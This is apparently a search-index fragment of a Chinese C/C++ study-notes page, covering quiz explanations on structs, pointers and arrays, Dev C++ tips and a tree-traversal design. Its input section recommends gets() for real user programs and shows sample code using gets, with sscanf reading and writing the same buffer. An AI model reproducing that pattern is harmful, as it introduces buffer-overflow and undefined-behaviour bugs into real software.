public : void append ( Node * x ); // \u628a\u8282\u70b9\u52a0\u5165\u8def\u5f84 void pop (); // \u5220\u6389\u6700\u540e\u52a0\u5165\u7684\u90a3\u4e2a\u8282\u70b9 int getSumData (); // \u8def\u5f84\u4e0a\u6240\u6709\u8282\u70b9\u7684 data\u7684\u548c int length (); // \u8def\u5f84\u5f53\u524d\u7684\u957f\u5ea6 friend bool cmp ( const Nodes & a , const Nodes & b ); // \u7528\u4e8e\u5bf9\u8def\u5f84\u8fdb\u884c\u6392\u5e8f friend ostream & operator << ( ostream & out , Nodes & x ); private : vector < Node *> data ; }; \u5bf9\u4e00\u4e2aconst\u7684vector\u4f7f\u7528\u8fed\u4ee3\u5668\u8981\u7528const_iterator \u00b6 \u6709\u65f6\u5019\u51fd\u6570\u53c2\u6570\u5c31\u89c4\u5b9a\u4e86\u5fc5\u987b\u662fconst\u7684\uff0c\u5982sort\u7684\u6bd4\u8f83\u51fd\u6570\uff0c\u800c\u6bd4\u8f83\u7684\u5bf9\u8c61\u53c8\u662fvector \u65b9\u6cd5\u5c31\u662f\u7528 vector<\u4f60\u7684\u7c7b\u578b>::const_iterator \u5c0f\u5fc3\u672a\u521d\u59cb\u5316\u7684\u53d8\u91cf \u00b6 \u5199\u4ee3\u7801\u7684\u65f6\u5019\u6700\u597d\u58f0\u660e\u7684\u65f6\u5019\u5c31\u7acb\u523b\u521d\u59cb\u5316\uff0c\u672a\u521d\u59cb\u5316\u7684\u53d8\u91cf\u662f\u672a\u5b9a\u4e49\u884c\u4e3a\uff0c\u53ef\u80fd\u51fa\u73b0\u52a0\u4e86\u4e2aprintf\u5c31\u597d\u4e86\uff0c\u53bb\u6389printf\u5c31\u70b8\u4e86\u7684\u60c5\u51b5\u3002 \u4f60\u53ef\u4ee5\u5728Linux\u4e0a\u4f7f\u7528 gcc -fsanitize=undefined \u7f16\u8bd1\uff0c\u8ba9Undefined Sanitizer\u4e3a\u4f60\u627e\u51fa\u9519\u8bef\uff1b\u987a\u5e26\u4e00\u63d0\uff0cASAN\u4e5f\u5f88\u6709\u7528\uff0c \u53c2\u89c1 \u83b7\u53d6\u6587\u4ef6\u5927\u5c0f \u00b6 Python\u91cc\u5f88\u7b80\u5355 \u4f60\u53ef\u4ee5os.path.getsize(filename) \u8fd9\u4e2a\u672c\u8d28\u4e0a\u8c03\u7528\u7684\u662fos.stat\uff1b\u4e0b\u9762\u7684\u65b9\u6cd5\u662f\u6253\u5f00\u6587\u4ef6\uff0c\u7528fseek\u8df3\u8f6c\u5230\u6587\u4ef6\u7ed3\u675f Learned from: http://blog.csdn.net/chenglibin1988/article/details/8750480 long int get_file_size(char* filename){ /* * \u4f7f\u7528fseek\u548cftell\u83b7\u53d6\u6587\u4ef6\u5927\u5c0f\uff0c\u5931\u8d25\u65f6\u8fd4\u56de-1 */ int filesize; FILE* fp = fopen(filename,\"rb\"); if( NULL == fp ) return -1; fseek(fp,0,SEEK_END); filesize = ftell(fp); fclose(fp); return filesize; } C\u7a0b\u4e60\u9898\u89e3\u7b54 \u00b6 \u5b66\u4e60\u4e00\u4e0b\u5404\u79cd\u5751\u7239\u7684\u9898\u76ee\u4e5f\u662f\u5f88\u4e0d\u9519\u7684\u561b\uff08\u5176\u5b9e\u6211\u5c31\u662f\u4e3a\u4e86\u628a\u6211\u7684\u89e3\u6790\u53d1\u4e0a\u6765\u3002\u3002\u3002 1.\u7ed3\u6784\u6307\u9488 \u00b6 \u9898\u76ee \u00b6 \u5bf9\u4e8e\u4ee5\u4e0b\u7ed3\u6784\u5b9a\u4e49\uff0cp->str++\u4e2d\u7684++\u52a0\u5728____\u3002 struct {int len; char *str}*p; A.\u6307\u9488str\u4e0a B.\u6307\u9488p\u4e0a C.str\u6307\u5411\u7684\u5185\u5bb9\u4e0a D.\u8bed\u6cd5\u9519\u8bef \u7b54\u6848 \u00b6 D \u4e00\u53e5\u8bdd\u89e3\u91ca \u00b6 \u4f60\u518d\u4ed4\u7ec6\u770b\u770b\uff1f\u662f\u4e0d\u662f\u5c11\u4e86\u4e2a\u5206\u53f7\uff1f \u8be6\u7ec6\u89e3\u91ca \u00b6 \u8fd9\u4e2a\u9898\u76ee\u8fd9\u4e48\u5199\u7f16\u8bd1\u5b58\u5728\u8bed\u6cd5\u95ee\u9898\u7684\uff0c\u800c\u4e14\u8fd0\u884c\u4e5f\u4f1a\u70b8 \u4f60\u8bd5\u8bd5\u590d\u5236\u5230Dev C++\u7f16\u8bd1\u770b\u770b\uff1f [ Error ] expected ';' at end of member declaration \u8fd9\u4e2a\u9519\u8bef\u5f88\u663e\u7136\u7684\u561b\uff0c\u7f3a\u5c11\u4e86\u5206\u53f7\uff0c\u6b63\u786e\u5199\u6cd5\uff1a struct {int len; char *str;} *p; \u8fd9\u5c31\u591f\u4e86\u5417\uff1f \u00b6 p\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u5bf9\u6307\u9488\u4f7f\u7528->\u8fd0\u7b97\u7b26\u4e4b\u524d\u5fc5\u987b\u8981\u7ed9\u6307\u9488\u4e00\u4e2a\u7a7a\u95f4(\u6b63\u786e\u7684\u503c)\uff0c\u5426\u5219\u5c31\u4f1a\u5bfc\u81f4*null\u800c\u6bb5\u9519\u8bef\u70b8\u6389 \u53e6\u5916 \u8fd9\u4e2astruct\u6ca1\u6709\u540d\u5b57\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u65e0\u6cd5\u7ed9\u4ed6\u8d4b\u503c\uff0c\u4e0d\u80fd\u88ab\u8d4b\u503c\u7684\u6307\u9488\u6709\u4ec0\u4e48\u7528\u5462\uff1f \u6b63\u786e\u7684\u5199\u6cd5\u5982\u4e0b\uff1a #include <stdio.h> #include <stdlib.h> #include <string.h> int main (){ char string [ 666 ] = \"abcd\" ; //\u51c6\u5907\u4e00\u4e2a\u5b57\u7b26\u4e32 struct name { int len ; char * str ;} s ; //\u9996\u5148\u8981\u7ed9struct\u53d6\u4e00\u4e2a\u540d\u5b57name\uff0c\u987a\u5e26\u7528\u8fd9\u4e2a\u540d\u5b57\u521b\u5efa\u4e00\u4e2a\u5b9e\u4f8bs s . str = string ; //\u5bf9\u8fd9\u4e2a\u5b9e\u4f8b\u7684str\u8d4b\u503c\u4e3astring\u7684\u5730\u5740 struct name * p = & s ; //\u7136\u540e\u662f\u7528struct name\u6765\u521b\u5efa\u4e00\u4e2a\u6307\u5411\u7ed3\u6784\u7684\u6307\u9488p p -> str ++ ; //\u76f8\u5f53\u4e8es\u7684str++\u4e86\uff0cstr\u539f\u6765\u6307\u5411\"abcd\"\u5b57\u7b26\u4e32\u7684'a'\uff0c\u73b0\u5728\u6307\u5411'b' puts ( p -> str ); //\u8f93\u51fabcd } \u56de\u987e\u4e00\u4e0b \u00b6 struct\u5fc5\u987b\u8981\u6709\u4e00\u4e2a\u540d\u5b57 struct\u5927\u62ec\u53f7\u4e2d\u7684\u6bcf\u4e00\u9879\u90fd\u5fc5\u987b \u4ee5\u5206\u53f7\u7ed3\u5c3e \u4f7f\u7528\u6307\u9488\u53d6\u503c \u5982 *p , p->something \u4e4b\u524d\u6307\u9488\u7684\u503c\u5fc5\u987b\u8bbe\u7f6e\u597d \u9047\u5230\u4e0d\u4f1a\u7684\u9898\u76ee\uff0c\u4e3a\u5565\u4e0d\u81ea\u5df1\u95ee\u95ee\u7f16\u8bd1\u5668\u5462\uff1f 2.\u7ed3\u6784\u6570\u7ec4 \u00b6 \u9898\u76ee \u00b6 \u5bf9\u4e8e\u4ee5\u4e0b\u7684\u53d8\u91cf\u5b9a\u4e49\uff0c\u8868\u8fbe\u5f0f____\u662f\u6b63\u786e\u7684\u3002 struct node { char s[10]; int k; } p[4]; A. p->k=2 B. p[0].s=\"abc\"; C. p[0]->k=2; D. p->s='a'; \u7b54\u6848 \u00b6 A \u89e3\u6790 \u00b6 p[0].num \u4e0e (*(p+0)).num \u7b49\u4ef7, \u6240\u4ee5 p[0].num \u4e0e (p+0)->num \u7b49\u4ef7 \u7f16\u8bd1\u4e00\u4e0b\u786e\u5b9eA\u662f\u53ef\u4ee5\u7684 B\u9009\u9879\u9519\u5728\u7ed3\u6784\u4f53\u91cc\u9762\u7684s\u662f\u4e00\u4e2a\u6709\u5185\u5b58\u7a7a\u95f4\u7684char\u6570\u7ec4\uff0c \u4e0d\u80fd\u628a\u6709\u5185\u5b58\u7a7a\u95f4\u7684\u6570\u7ec4\u540d\u79f0\u653e\u5230\u8d4b\u503c\u7684\u7b49\u53f7\u5de6\u8fb9 (\u7f16\u8bd1\u5668\u628a\u6570\u7ec4\u540d\u79f0\u5f53\u6210\u5e38\u91cf\uff0c\u7f16\u8bd1\u5668\u8fd9\u4e48\u8bbe\u8ba1\u7684\u539f\u56e0\u4e5f\u8bb8\u662f\uff1a\u4e0d\u7136\u8fd9\u4e2a\u5185\u5b58\u7a7a\u95f4\u4e0d\u5c31\u5f04\u4e22\u4e86\u561b) \u5b57\u7b26\u4e32\u6b63\u786e\u7684\u201d\u8d4b\u503c\u201d\u64cd\u4f5c\u662f\uff1a strcpy(p[0].s,\"abc\"); C\u9009\u9879 p[0]\u662f\u7ed3\u6784\uff0c\u800c\u4e0d\u662f\u6307\u9488\uff0c\u76f4\u63a5\u5199 p[0].k=2 D\u9009\u9879 \u8fd8\u662f\u76f8\u540c\u7684\u9053\u7406 \u4e0d\u80fd\u628a\u6709\u5185\u5b58\u7a7a\u95f4\u7684\u6570\u7ec4\u540d\u79f0\u653e\u5230\u8d4b\u503c\u7684\u7b49\u53f7\u5de6\u8fb9 \u6b63\u786e\u7684\u5199\u6cd5 p->s[0]='a' , \u4e5f\u53ef\u4ee5\u5199 p[0].s[0]='a' \u6307\u9488\uff0c\u6570\u7ec4\u5404\u79cd\u73a9\u6cd5 \u00b6 \u5982\u679c\u8981\u5199 p[1].s[2]='a' , \u7b49\u4ef7\u7684\u5199\u6cd5\u6709\uff1a (p+1)->s[2]='a'; *((p+1)->s + 2)='a'; *((char*)p+1*sizeof(struct node)+2)='a'; \u6b64\u4ee3\u7801\u4f9b\u4f60\u6d4b\u8bd5\uff1a #include <stdio.h> int main (){ struct node { char s [ 10 ]; int k ; } p [ 4 ]; p [ 1 ]. s [ 2 ] = 'a' ; printf ( \"%c \\n \" , p [ 1 ]. s [ 2 ]); ( p + 1 ) -> s [ 2 ] = 'b' ; printf ( \"%c \\n \" , p [ 1 ]. s [ 2 ]); * (( p + 1 ) -> s + 2 ) = 'c' ; printf ( \"%c \\n \" , p [ 1 ]. s [ 2 ]); * (( char * ) p + 1 * sizeof ( struct node ) + 2 ) = 'd' ; printf ( \"%c\" , p [ 1 ]. s [ 2 ]); return 0 ; } \u6570\u7ec4\u7684\u6570\u7ec4 \u00b6 \u9898\u76ee\uff1a \u4ee5\u4e0b\u7a0b\u5e8f\u7684\u8f93\u51fa\u7ed3\u679c\u662f _________________ \u3002 #include <stdio.h> #include <string.h> typedef char ( * AP )[ 5 ]; AP defy ( char * p ) { int i ; for ( i = 0 ; i < 3 ; i ++ ) p [ strlen ( p )] = 'A' ; return ( AP ) p + 1 ; } void main () { char a [] = \"FROG \\0 SEAL \\0 LION \\0 LAMB\" ; puts ( defy ( a )[ 1 ] + 2 ); } \u89e3\u7b54\uff1a \u641e\u6e05\u695a\u6307\u9488\u7684\u7c7b\u578b\u8fd9\u4e2a\u9898\u76ee\u5c31\u5f88\u7b80\u5355\u4e86\uff0c\u53e6\u5916\u8bb0\u4f4f\u8fd9\u4e2a\u516c\u5f0f\uff1a x [ i ] = * ( x + i ) p[strlen(p)] = \u2018A\u2019; \u5c31\u662f\u628a\\0\u7684\u5730\u65b9\u6539\u6210\u4e86\u5b57\u7b26A \u6240\u4ee5\u6211\u4eec\u7684a\u662f\u8fd9\u6837\u5b50\u7684\uff1a \u4ece\u4e00\u7ef4\u6570\u7ec4\u6765\u770ba\u662f FROGASEALALIONALAMB \u4ece5\u5b57\u8282char\u7684\u6570\u7ec4\u7684\u6570\u7ec4\u6765\u770b\u662f \"FROGA\", //\u867d\u7136\u8fd9\u91cc\u5199\u7684\u662f\u5b57\u7b26\u4e32\uff0c\u4f46\u672b\u5c3e\u6ca1\u6709\\0 \"SEALA\", \"LIONA\", \"LAMB\\0\" defy(a)[1]\u5c31\u7b49\u4ef7\u4e8e *(defy(a) +1) \uff0c\u5c31\u662f *( ((AP)a)+1 +1) \uff0c\u5c31\u662f((AP)a)[2] AP\u8fd9\u4e2a\u7c7b\u578b\u662f\u6307\u9488\uff0c\u6307\u5411\u7684\u5143\u7d20\u662f 5\u5b57\u8282\u5927\u5c0f\u7684\u6570\u7ec4\uff0c \u6240\u4ee5((AP)a)[2]\u7684\u7c7b\u578b\u662f char* \uff0c\u6307\u5411\u7684\u662f\u201dLIONA\u201d\u8fd9\u4e2a\u5143\u7d20 \u4f46\u662f\u5f53\u6211\u4eec\u628a\u8fd9\u4e2a\u5143\u7d20\u5f53\u6210 char* \u7528puts\u8f93\u51fa\u7684\u65f6\u5019\uff0c\u7531\u4e8e\u672b\u5c3e\u6ca1\u6709 \\0 \uff0c\u6240\u4ee5\u8981\u7ee7\u7eed\u8f93\u51fa\uff0c\u5c31\u662f\u201dLIONALAMB\u201d \u518d+2\u5c31\u662f\u8981\u8df3\u8fc7\u4e24\u4e2a\u5b57\u8282\uff0c\u5f97\u5230\u7b54\u6848\u201dONALAMB\u201d \u4e3e\u4e00\u53cd\u4e09\uff1a puts(((AP)a)[0])\u8f93\u51fa\u5565\uff1f\u5047\u8bbe\u6ca1\u6709\u8c03\u7528defy(a) puts(((AP)a)[0])\u8f93\u51fa\u5565\uff1f\u5047\u8bbe\u5df2\u7ecf\u505a\u4e86defy(a) puts(((AP)a)[0]+3)\u8f93\u51fa\u5565\uff1f\u5047\u8bbe\u5df2\u7ecf\u505a\u4e86defy(a) defy(a)[2][1]+1\u662f\u4ec0\u4e48\u7c7b\u578b\uff1f\u503c\u662f\u591a\u5c11\uff1f puts(&defy(a)[2][1])\u8f93\u51fa\u5565\uff1f defy(a)\u4e4b\u540e\u518dputs(&defy(a)[2][1])\u8f93\u51fa\u5565\uff1f \u7b54\u6848\uff1a FROG FROGASEALALIONALAMB GASEALALIONALAMB char\u7c7b\u578b \u2018B\u2019 \u8fd9\u4e2a\u662fchar\u7684\u2019A\u2019\u518d\u52a0\u4e00 AMB \u53d1\u751f\u4e86\u6570\u7ec4\u8d8a\u754c\u8bfb\u5199\uff0c\u8fd9\u662fundefined behaviour","title":"C\u8bed\u8a00"},{"location":"C/#c","text":"\u4e00\u70b9\u5173\u4e8eC\u7684\u5efa\u8bae\u54af\uff0c\u4e5f\u5305\u542bC++ \u987a\u5e26\u9644\u4e0a\u51e0\u4e2a\u9898\u76ee\u548c\u6211\u5199\u7684\u89e3\u7b54","title":"C\u8bed\u8a00"},{"location":"C/#dev-c","text":"\u6709\u65f6\u5019\u4f1a\u53d1\u751f\u6539\u4e86\u4ee3\u7801\u4f46\u8fd0\u884c\u8d77\u6765\u662f\u65e7\u7248\u672c\u7684\u60c5\u51b5\uff0c\u9700\u8981\u68c0\u67e5\u662f\u5426\u5173\u95ed\u4e86\u6b63\u5728\u8fd0\u884c\u7684exe\uff0c\u5982\u679c\u662f\u5de5\u7a0b\u9700\u8981\u6309F12\u5168\u90e8\u91cd\u65b0\u7f16\u8bd1\u6e05\u7a7a\u7f13\u5b58 \u7f16\u8bd1\u5de5\u7a0b\u9519\u8bef\u5b9a\u4f4d\u5728Makefile\u8bf4\u660e\u6709\u51fd\u6570\u58f0\u660e\u4e86\u4f46\u6ca1\u6709\u5b9a\u4e49\uff0c\u6216\u8005\u53ef\u80fd\u662f\u51fa\u73b0\u4e86\u591a\u4e2a\u6587\u4ef6\u540c\u540d\u51fd\u6570\uff0c\u5c0f\u5fc3\u5176\u521b\u5efa\u5de5\u7a0b\u7684\u65f6\u5019\u81ea\u52a8\u4ea7\u751f\u7684main.c \u5982\u679c\u5355\u7eaf\u53ea\u9700\u8981\u7f16\u8bd1\u4e00\u4e2aC\u6587\u4ef6\uff0c\u4e3a\u8ffd\u6c42\u7f16\u8bd1\u901f\u5ea6\u53ef\u4ee5\u8003\u8651\u4f7f\u7528tcc (Tiny C Compile)\u7f16\u8bd1\u5668\uff0c\u53c2\u89c1 https://qs1401.com/?post=18 \uff1b\u53e6\u5916\u4f60\u53ef\u4ee5\u4fee\u6539\u7f16\u8bd1\u7684\u4f18\u5316\u53c2\u6570\uff0c\u4e0d\u8981\u7528 -O3 \u8fd9\u79cd\u66f4\u9002\u5408\u6b63\u5f0f\u53d1\u5e03\u65f6\u7684\u4f18\u5316\u9009\u9879 \u4e0d\u8981\u5728\u4e00\u4e2a\u9879\u76ee\u4e2d\u6df7\u7528.c\u548c.cpp\uff0c\u5c06\u5bfc\u81f4 ld \u94fe\u63a5\u7684\u65f6\u5019\u51fd\u6570\u627e\u4e0d\u5230\u3002\u56e0\u4e3a\u7f16\u8bd1.cpp\u7684\u65f6\u5019\u662fC++\u7684\u7f16\u8bd1\uff0c\u7531\u4e8e\u8981\u652f\u6301\u91cd\u8f7d\uff0c\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u4fee\u6539\u51fd\u6570\u540d\u79f0\uff0c\u5bfc\u81f4\u4ee3\u7801\u4e2d\u540c\u6837\u540d\u5b57\u7684\u51fd\u6570\u7f16\u8bd1\u51fa\u6765\u7684.o\u6587\u4ef6\u91cc\u9762\u51fd\u6570\u540d\u79f0\u662f\u4e0d\u540c\u7684\uff0c\u8fd9\u6837.c\u627e\u4e0d\u5230.cpp\u7684\u51fd\u6570\uff0c\u81ea\u7136\u65e0\u6cd5\u94fe\u63a5\uff1b\u4e0d\u8fc7\u8fd8\u662f\u6709\u6280\u5de7\u7684\uff1aextern \u201cC\u201d\u5305\u4f4f\u5373\u53ef \u6ce8\u610f\u6307\u9488\u7684\u661f\u53f7\u522b\u5c11\u5199\uff1a\u60f3\u4e00\u6b21\u5199\u4e24\u4e2a\u6307\u9488\uff1f\u4e0d\u80fd\u5199 FILE* fp1,fp2; \u800c\u662f\u6bcf\u4e2a\u53d8\u91cf\u524d\u9762\u90fd\u8981\u5e26\u4e0a\u661f\u53f7\uff01\u6b63\u786e\u5199\u6cd5\uff1a FILE *fp1,*fp2; char *s1,*s2;","title":"\u5173\u4e8eDev C++"},{"location":"C/#_1","text":"\u5728\u5f00\u53d1\u771f\u5b9e\u7528\u6237\u4f1a\u4f7f\u7528\u7684\u547d\u4ee4\u884c\u7a0b\u5e8f\u65f6\uff0c\u6211\u5efa\u8bae\u6240\u6709\u7684\u8f93\u5165\u5168\u90e8\u4f7f\u7528gets\u5b8c\u6210\uff0c\u7136\u540e\u518d\u7528sscanf\u8bfb\u53d6\u5230\u53d8\u91cf\uff0c\u53ef\u4ee5\u6709\u6548\u9632\u6b62scanf\u5728\u4e00\u884c\u51fa\u9519\u6ce2\u53ca\u5230\u4e0b\u4e00\u884c \u5f53\u7136\u66f4\u5b89\u5168\u7684\u662f fgets(buf,9999,stdin); \u6307\u5b9a\u6700\u591a\u8bfb\u53d6\u591a\u5c11\u4e2a\u5b57\u8282\u907f\u514d\u6808\u6ea2\u51fa\uff0c\u4f46\u8fd9\u79cd\u65b9\u6cd5\u4f1a\u5f97\u5230\\n\u5b57\u7b26 \u53e6\u5916\uff0c\u65e0\u8bba\u662fscanf\u8fd8\u662fsscanf\uff0c\u8d4b\u503c\u7ed9int/double\u7b49\u7c7b\u578b\u7684\u53d8\u91cf\u4e00\u5b9a\u8981\u5199&\u7b26\u53f7\uff01 \u4ee5\u4e0b\u4ee3\u7801\u6f14\u793a\u8fd9\u79cd\u8f93\u5165\u65b9\u6cd5\uff0c\u5bf9\u8f93\u5165\u7684n\u4e2a\u6570\u8c03\u7528qsort\u6392\u5e8f\uff1b\u8f93\u5165\u683c\u5f0f\uff1a\u7b2c\u4e00\u884c N\u8868\u793a\u6570\u7684\u4e2a\u6570\uff0c\u7b2c\u4e8c\u884c N\u4e2a\u9700\u8981\u6392\u5e8f\u7684\u6570(N<1000) #include <stdio.h> #include <stdlib.h> char buf [ 9999 ]; int data [ 1005 ]; //\u4e0d\u8981\u5728\u5c40\u90e8\u53d8\u91cf\u5b9a\u4e49\u5927\u6570\u7ec4\uff0c\u4f1a\u70b8\u6808 int cmp ( const void * a , const void * b ){ return * ( int * ) a -* ( int * ) b ; } int main (){ int N , i ; gets ( buf ); sscanf ( buf , \"%d\" , & N ); gets ( buf ); for ( i = 0 ; i < N ; i ++ ) { sscanf ( buf , \"%d %[^ \\n ]\" , & data [ i ], buf ); } qsort ( data , N , sizeof ( int ), cmp ); for ( i = 0 ; i < N -1 ; i ++ ) printf ( \"%d \" , data [ i ]); printf ( \"%d\" , data [ i ]); }","title":"\u8f93\u5165\u7684\u95ee\u9898"},{"location":"C/#csstreamsprintf","text":"#include <string> #include <sstream> #include <iostream> using namespace std ; int main (){ stringstream s ; string result ; int i = 1000 ; s << \"haha \" << i ; getline ( s , result ); // the whole line rather than just the first word cout << result << endl ; // print \"haha1000\" s . clear (); }","title":"C++\u7528sstream\u4ee3\u66ffsprintf"},{"location":"C/#g","text":"g++\u4e3a\u4e86\u9632\u6b62\u5728\u51fd\u6570\u8fd4\u56de\u503c\u662f\u5bf9\u8c61\u7684\u65f6\u5019\uff0c\u62f7\u8d1d\u6784\u9020\u88ab\u8c03\u7528\u591a\u6b21\uff0c\u5373\u4f7f\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u6709\u526f\u4f5c\u7528\uff0c\u4e5f\u4f1a\u88ab\u4f18\u5316\u6389\uff08\u76f4\u63a5\u5c31\u4e0d\u8c03\u7528\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u4e86\uff09 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4ece\u800c\u8bc1\u660e\u6559\u6750\u4e0a\u7684\u6b63\u786e\u6027/\u8bed\u8a00\u7684\u7279\u6027\uff0c\u9700\u8981\u5728\u7f16\u8bd1\uff08\u4e0d\u662f\u94fe\u63a5\uff09\u7684\u65f6\u5019\u52a0\u5165\u4ee5\u4e0b\u5f00\u5173\uff1a - fno - elide - constructors","title":"\u89e3\u51b3g++\u7701\u7565\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u7684\u95ee\u9898"},{"location":"C/#_2","text":"\u5141\u8bb8\u4e0d\u786e\u5b9a\u4e2a\u5143\u7d20\u7684\u5b50\u8282\u70b9\u4e2a\u6570\uff0c\u8981\u6c42\u7ed9\u51fa\u6240\u6709\u4ece\u6839\u8282\u70b9\u5f00\u59cb\u5230\u53f6\u8282\u70b9\u7684\u8def\u5f84 \u6211\u662f\u8fd9\u4e48\u5199\u7684\u904d\u5386\u5faa\u73af\uff08\u4f2a\u4ee3\u7801\uff09\uff0c\u5176\u4e2dp1\u548cp2\u662f\u6307\u5411\u8282\u70b9\u7684\u6307\u9488\uff1a \u8def\u5f84=[\u6839\u8282\u70b9] while(\u5faa\u73af\u6761\u4ef6): while (p2=p1\u7684\u4e0b\u4e00\u4e2a\u6ca1\u6709\u904d\u5386\u8fc7\u7684\u5b50\u8282\u70b9)\u4e0d\u4e3a\u7a7a: \u628ap2\u52a0\u5165\u8def\u5f84 p1=p2 if p1\u4e3a\u53f6\u8282\u70b9: \u5f97\u5230\u4e86\u4e00\u6761\u4ece\u6839\u8282\u70b9\u5230\u4e00\u4e2a\u53f6\u8282\u70b9\u7684\u8def\u5f84 \u8def\u5f84pop\uff0c\u6362\u8a00\u4e4b\uff0c\u5220\u6389\u6700\u540e\u52a0\u5165\u7684\u8282\u70b9 p1=p1\u7684\u7236\u8282\u70b9\uff08\u5c31\u662f\u56de\u6eaf\uff09 \u5176\u4e2d\u5173\u952e\u7684 p1\u7684\u4e0b\u4e00\u4e2a\u6ca1\u6709\u904d\u5386\u8fc7\u7684\u5b50\u8282\u70b9 \u7684\u5b9e\u73b0\u662f\u8fd9\u6837\u5b50\u7684\uff1a if \u5f53\u524d\u5b69\u5b50\u7684\u4e0b\u6807>=\u5b69\u5b50\u603b\u6570: return NULL else return \u5b50\u8282\u70b9\u6570\u7ec4[\u5f53\u524d\u4e0b\u6807++] \u5356\u4e2a\u5173\u5b50\u3002\u3002\u3002\u8bf7\u601d\u8003\u4e00\u4e0b\u5faa\u73af\u6761\u4ef6\u5e94\u8be5\u5199\u5565\uff1f","title":"[\u6570\u636e\u7ed3\u6784]\u6811\u7684\u904d\u5386"},{"location":"C/#_3","text":"\u4e00\u5f00\u59cb\u6211\u5199\u7684\u662f\uff1a\u201c\u6839\u8282\u70b9\u8fd8\u6709\u672a\u904d\u5386\u8fc7\u7684\u5b50\u8282\u70b9\u201d\uff0c\u4f46\u662f\u8fd9\u4e48\u5199\u5728\u8fd9\u91cc\u5c31\u51fa\u4e86\u95ee\u9898\uff0c\u7531\u4e8e\u6807\u8bb0\u5df2\u7ecf\u904d\u5386\u7684\u5b50\u8282\u70b9\u53d1\u751f\u5728\u771f\u6b63\u904d\u5386\u5b8c\u5b50\u8282\u70b9\u4e4b\u524d\uff08\u6211\u7528\u7684return \u6570\u7ec4[\u4e0b\u6807++]\uff09\uff0c\u5728\u5faa\u73af\u6839\u8282\u70b9\u7684\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\u7684\u65f6\u5019\u4f1a\u63d0\u524d\u7ed3\u675f\u5faa\u73af\uff0c\u5bfc\u81f4\u6ca1\u80fd\u904d\u5386\u6240\u6709\u8282\u70b9\uff01 \u6b63\u786e\u7684\u5199\u6cd5\u662f\uff1a \u8def\u5f84\u7684\u5143\u7d20\u4e2a\u6570>=1 \u8def\u5f84\u53ef\u4ee5\u7528vector\u5b9e\u73b0\uff0c\u5143\u7d20\u4e2a\u6570\u5c31\u662fvector\u7684size()\uff0c\u53ea\u6709\u904d\u5386\u5b8c\u6210\u4e86\u6574\u4e2a\u6811\u4e4b\u540e\uff0c\u6839\u8282\u70b9\u624d\u4f1a\u88abpop\u51fa\u6765\uff0c\u7ed3\u675f\u5faa\u73af\u3002","title":"\u904d\u5386\u7684\u5faa\u73af\u6761\u4ef6"},{"location":"C/#_4","text":"\u8fd9\u4e2a\u9898\u76ee\u6211\u4f7f\u7528\u4e86C++\u6765\u5199\uff0c\u679c\u7136\u6bd4C\u597d\u591a\u4e86\u3002\u3002\u3002\u53ea\u8981\u60f3\u597d\u63a5\u53e3\u5c31\u80fd\u5f88\u65b9\u4fbf\u5730\u5b9e\u73b0\u9700\u8981\u7684\u529f\u80fd\u5566\uff08\u4e0d\u8fc7\u8fd8\u662fPython\u5185\u7f6e\u7684list\u597d\u591a\u4e86\uff0cC++\u7684vector\u5404\u79cdconst\u7684\u5751 \u8fd9\u91cc\u5206\u4eab\u4e00\u4e0b\u6211\u8bbe\u8ba1\u7684\u63a5\u53e3\uff1a class Node { public : Node (); void setChildNum ( int num ); // \u4e3a\u5b50\u8282\u70b9\u7684\u6307\u9488\u7684\u6570\u7ec4\u5206\u914d\u7a7a\u95f4 void addOneChild ( Node * child ); void setData ( int data ); int getData (); void setParent ( Node * parent ); Node * getParent (); Node * getCurrentChild (); // \u83b7\u5f97\u5f53\u524d\u8fd8\u6ca1\u8d70\u8fc7\u7684\u5b50\u8282\u70b9\uff0c\u5e76\u4e14\u628a\u8fd4\u56de\u7684\u5b50\u8282\u70b9\u6807\u8bb0\u4e3a\u8d70\u8fc7\u4e86 bool hasChildToGo (); // \u8fd9\u4e2a\u8282\u70b9\u662f\u4e0d\u662f\u6240\u6709\u7684\u5b50\u8282\u70b9\u90fd\u5b8c\u6210\u4e86 bool isLeafNode (); // \u8fd9\u4e2a\u8282\u70b9\u662f\u4e0d\u662f\u53f6\u8282\u70b9 private : //... \u7701\u7565\u54af ... }; class Nodes { // \u5b58\u50a8\u8def\u5f84\u7684 Nodes public : void append ( Node * x ); // \u628a\u8282\u70b9\u52a0\u5165\u8def\u5f84 void pop (); // \u5220\u6389\u6700\u540e\u52a0\u5165\u7684\u90a3\u4e2a\u8282\u70b9 int getSumData (); // \u8def\u5f84\u4e0a\u6240\u6709\u8282\u70b9\u7684 data\u7684\u548c int length (); // \u8def\u5f84\u5f53\u524d\u7684\u957f\u5ea6 friend bool cmp ( const Nodes & a , const Nodes & b ); // \u7528\u4e8e\u5bf9\u8def\u5f84\u8fdb\u884c\u6392\u5e8f friend ostream & operator << ( ostream & out , Nodes & x ); private : vector < Node *> data ; };","title":"\u4f7f\u7528\u9762\u5411\u5bf9\u8c61\u7684\u601d\u60f3"},{"location":"C/#constvectorconst_iterator","text":"\u6709\u65f6\u5019\u51fd\u6570\u53c2\u6570\u5c31\u89c4\u5b9a\u4e86\u5fc5\u987b\u662fconst\u7684\uff0c\u5982sort\u7684\u6bd4\u8f83\u51fd\u6570\uff0c\u800c\u6bd4\u8f83\u7684\u5bf9\u8c61\u53c8\u662fvector \u65b9\u6cd5\u5c31\u662f\u7528 vector<\u4f60\u7684\u7c7b\u578b>::const_iterator","title":"\u5bf9\u4e00\u4e2aconst\u7684vector\u4f7f\u7528\u8fed\u4ee3\u5668\u8981\u7528const_iterator"},{"location":"C/#_5","text":"\u5199\u4ee3\u7801\u7684\u65f6\u5019\u6700\u597d\u58f0\u660e\u7684\u65f6\u5019\u5c31\u7acb\u523b\u521d\u59cb\u5316\uff0c\u672a\u521d\u59cb\u5316\u7684\u53d8\u91cf\u662f\u672a\u5b9a\u4e49\u884c\u4e3a\uff0c\u53ef\u80fd\u51fa\u73b0\u52a0\u4e86\u4e2aprintf\u5c31\u597d\u4e86\uff0c\u53bb\u6389printf\u5c31\u70b8\u4e86\u7684\u60c5\u51b5\u3002 